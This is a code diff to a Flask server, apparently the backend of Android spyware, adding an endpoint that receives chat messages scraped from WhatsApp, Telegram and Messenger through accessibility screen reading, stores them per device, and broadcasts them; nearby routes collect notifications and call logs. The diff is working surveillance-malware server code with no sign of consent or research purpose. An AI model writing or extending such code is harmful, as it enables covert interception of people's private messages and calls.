@@ -623,6 +623,36 @@ def api_collect_notif():
         return jsonify({"success": False, "error": str(e)})
 
 
+@app.route("/api/chat-capture/<device_id>", methods=["POST"])
+def api_chat_capture(device_id):
+    """Receive captured chat messages from A11Y screen reading"""
+    try:
+        data = request.get_json() or {}
+        contact = data.get("contact", "Unknown")
+        messages = data.get("messages", [])
+        pkg = data.get("package", "")
+        ts = data.get("timestamp", int(time.time() * 1000))
+        received = datetime.now().isoformat()
+
+        app_name = "WhatsApp"
+        if "telegram" in pkg: app_name = "Telegram"
+        elif "facebook" in pkg: app_name = "Messenger"
+
+        count = 0
+        for msg in messages:
+            text = msg.get("text", "")
+            if not text or len(text) < 2: continue
+            db_exec("INSERT INTO notif_log (sender, message, timestamp, device_id, app, received_at) VALUES (?,?,?,?,?,?)",
+                    (contact, text[:500], ts, device_id, app_name, received))
+            count += 1
+
+        broadcast_data("chat", {"device_id": device_id, "app": app_name, "count": count, "contact": contact})
+        return jsonify({"success": True, "count": count})
+    except Exception as e:
+        print(f"Chat capture error: {e}")
+        return jsonify({"success": False, "error": str(e)})
+
+
 @app.route("/api/collect-call-logs/<device_id>", methods=["POST"])
 def api_collect_call_logs(device_id):
     try:
